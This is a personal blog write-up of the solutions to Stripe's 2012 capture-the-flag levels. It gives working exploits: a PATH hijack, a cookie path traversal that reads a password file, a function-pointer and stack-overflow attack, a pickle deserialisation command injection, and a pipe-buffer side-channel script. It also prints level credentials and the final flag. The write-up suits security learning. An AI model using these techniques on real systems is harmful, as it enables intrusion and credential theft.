---
title: 'My Stripe CTF writeup'
date: 2012-03-01T00:00:00+02:00
tags: ["CTF", "writeup", "hacking"]
draft: false
---

Recently [Stripe](http://stri.pe/) (a startup trying to improve online payments
for web developers) put online [a fun CTF
challenge](https://stripe.com/blog/capture-the-flag) with simple security
exercises. Now that the challenge is done and the CTF is offline, I wanted to
share my solutions with people who were interested in this CTF but were not
able to solve it before the time limit.

Unfortunately I don't have the original source code of the exercises here. I
hope that the Stripe CTF organizers will publish those so that I can explain my
exploits better 🙂

<!--more-->

level01
-------

The given binary executes `system("date");` in order to display the
date. `system` looks into the `PATH` environment variable to locate binaries.
As an attacker, we can control `PATH` and make it point to a directory we
control which contains a `date` executable file. Here is my solution:

```
$ ln -s /bin/sh date
$ PATH=.:$PATH /levels/level01
```

level02
-------

The MOTD gives us some infos about this level: there is a web server running
on `localhost:80` which requires `Digest` authentication to access a PHP page
of which we have the source. I don't have the PHP source here but basically, it
checked for the existence of a cookie, and if it exists it displays the
contents of `"/var/www/$cookie_value"`. Cookies can be manipulated by the
attacker, so we can control the displayed file. Here is my solution:

```
$ curl -v -b user_details=../../home/level03/.password\
      -u level02:kxlVXUvzv --digest http://ctf.stri.pe/level02.php
```

level03
-------

Things get a little harder. Here, we have a C binary which basically does this:

{{< highlight c >}}
func_ptr table[4] = { func1, func2, func3, func4 };
int i = atoi(argv[1]);
if (i >= 4)
    error();
table[i]();
{{< / highlight >}}

This code does not check if `i` is negative. We can use that to dereference a
function pointer which was put in the stack later. It turns out we can control
some part of the stack (our `argv[2]` is copied in a stack buffer), so it is
just a matter of finding the right offset to control the function pointer
dereference and finding the right function on which to jump. Luckily, one of
the unused functions in the `level03` binary is a wrapper for `system(3)` and
we can use it to execute an arbitrary shell command. My solution:

```
/levels/level03 -27 "$(echo -ne "sh #\x5b\x87\x04\x08")"
```

Explanation: `-27` if the offset to 4 characters after the start of
the `argv[2]` copy, which contains our function pointer. The first 4 chars
of `argv[2]` are the arbitrary command: `sh` followed by the start of a comment
so that the `sh` binary does not freak out 🙂

level04
-------

The basic example of a stack overflow: `strcpy` of a user controlled string
without any length check. This should be trivial to exploit, but the presence
of `ASLR` makes it a bit harder: the stack location in memory is randomized,
making it hard to jump on our shellcode in the stack. To bypass that, there are
two solutions: either find a `jmp *%eax` at a fixed address in memory (for
example, in `.text`) and use it to overwrite the function return address so
that the `ret` returns to the shellcode, or be hardcore and bruteforce the
address. Both solutions were doable, and I went with the bruteforce because I
did not think about the `jmp *%eax` in the first place 😛 .

Using [stackbf2.c](http://gunslingerc0de.wordpress.com/2010/07/26/stackbf2-c/) with
the right parameters, exploiting this is trivial. Basically:

```
gcc brute.c
./a.out /levels/level04 1040
```

*Note: while I was writing this article, [w4kfu](http://blog.w4kfu.com/) gave
me a better solution: using `ulimit -s unlimited` makes the exploit possible
using a `ret2libc` technique. Food for thought 🙂*

level05
-------

For this level we have a "large" client/server Python application which uses a
server to process HTTP queries, put data in a queue so that it can be processed
by a worker, and get data back from the queue when it has been processed. The
worker waits for data to be put in the queue, uppercases the data, then puts it
back in the queue. The queue is basically a directory with "job" files in this
format:

```
type: %s; data: %s; job: %s
```

Data is unserialized using this code:

{{< highlight python >}}
parser = re.compile('^type: (.*?); data: (.*?); job: (.*?)$', re.DOTALL)
match = parser.match(serialized)
direction = match.group(1)
data = match.group(2)
job = pickle.loads(match.group(3))
{{< /highlight >}}

The trick is to see that you can basically get a user controlled string
for `match.group(3)` if you have `"; job: "` in your data. Python's pickle
module is not really done to unserialize user controlled stuff: it is very easy
to make it do what you want as soon as you control what it unserializes.

You can control how an object is serialized using its `__reduce__` method. I
basically created an object with `__reduce__` calling `os.system("cp
/home/level06/.password /tmp/1")`, injected it as a "job" object into the
queue, and got the password file copied where I wanted it.

level06
-------

When I first saw the code I immediately thought "this must be exploited through
a timing attack: count the number of characters written on `stderr` before data
is written on `stdout`". Unfortunately, it is not that easy: scheduling and
pipe bufferization completely breaks all forms of basic timing you could use. I
tried several methods to get the writes on `stderr` to block so that I could
more precisely detect when the write on `stdout` was done, but did not manage
it the first day.

Then, the day before the end of the CTF, I thought a bit more about it (I
really wanted a free t-shirt :D) and the solution came to my mind: prefilling
the pipe buffer so that we can control after how many characters it blocks.
That way we can see if the write on `stdout` was done before a certain number
of characters on `stderr`. That way we can bruteforce one character by one
character to get the full password to `level06`. Here is my exploit code which
checks if the start of the password matches `argv[1]`:

{{< highlight python >}}
import os
import signal
import sys

CONSTSIZE = 33
PIPEBUFSIZE = 65536

orig_guess = guess = sys.argv[1]

guess += "a" # because we need one more char to be sure

out, out_child = os.pipe()
err, err_child = os.pipe()
pid = os.fork()
if not pid:
    os.write(err_child, '\x00' * (65503 - len(orig_guess)))
    os.dup2(out_child, 1)
    os.dup2(err_child, 2)
    os.execl('/levels/level06', 'level06', '/home/the-flag/.password', guess)

def alarmed(*a):
    print 'Success: %r' % orig_guess
    os.kill(pid, 9)
    sys.exit(0)

signal.signal(signal.SIGALRM, alarmed)
signal.alarm(1)
os.read(out, 1)

print 'Fail: %r' % orig_guess
os.kill(pid, 9)
sys.exit(1)
{{< /highlight >}}

Final key: `theflagl0eFTtT5oi0nOTxO5`

Conclusion
----------

Overall, this was a really fun CTF organized by the folks at Stripe. It's
really too bad that it was not longer (if I did not get stuck on that last
exercise like an idiot I would have basically done it in 5 hours) with more
complex exercises (remote exploitation is always fun, reverse engineering too
🙂 ). Still, it's a great learning tool for people who are not really into
computer security and local exploitation, and I'd like to see more people do
that kind of stuff.
